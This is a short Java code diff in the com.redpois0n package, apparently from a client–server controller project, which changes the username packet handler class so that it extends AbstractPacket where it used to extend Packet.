@@ -4,7 +4,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.Frame;
 import com.redpois0n.utils.Util;
 
-public class PacketUSERNAME extends Packet {
+public class PacketUSERNAME extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
